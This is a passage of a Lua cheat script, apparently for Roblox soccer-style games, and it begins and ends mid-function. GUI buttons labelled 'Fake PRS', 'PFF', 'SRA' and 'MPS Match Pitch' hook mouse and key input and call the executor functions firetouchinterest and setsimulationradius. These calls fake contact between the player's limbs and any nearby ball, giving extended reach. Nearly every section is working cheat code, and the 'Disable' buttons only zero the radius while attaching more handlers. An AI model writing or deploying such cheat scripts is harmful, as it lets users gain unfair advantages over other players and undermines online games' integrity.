                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)

----------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 0
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)

-----------------------------------------------

local Section = Tab:NewSection("Fake PRS")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 10
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

-------------------------------------------------------------------------

local Section = Tab:NewSection("PFF")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")

_G.BallName = "TPS"
_G.Magnitude = 5
_G.Enabled = true
-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

-----------------------------------------------------------------
Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "TPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end )
------------------------------

local Section = Tab:NewSection("SRA")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "l̸̼̔il̷͎̅ḭ̴͘iḮ̷̙il̶̼̈́il̴̘̕Ĩ̵̹į̴̌"
_G.Magnitude = 6
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "l̸̼̔il̷͎̅ḭ̴͘iḮ̷̙il̶̼̈́il̴̘̕Ĩ̵̹į̴̌"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

local Section = Tab:NewSection("MPS Match Pitch")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 6
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "MPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
